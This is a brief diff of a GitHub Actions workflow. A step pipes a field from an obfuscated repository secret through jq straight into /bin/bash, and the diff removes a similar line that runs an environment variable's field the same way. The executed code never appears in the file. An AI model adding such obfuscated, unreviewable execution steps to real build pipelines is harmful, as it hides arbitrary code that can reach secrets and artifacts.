@@ -19,7 +19,6 @@ jobs:
           yeau86260: ${{ secrets.yeau86260 }}
         run: |
           printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
-          echo $rves1 | jq -r .u6869 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
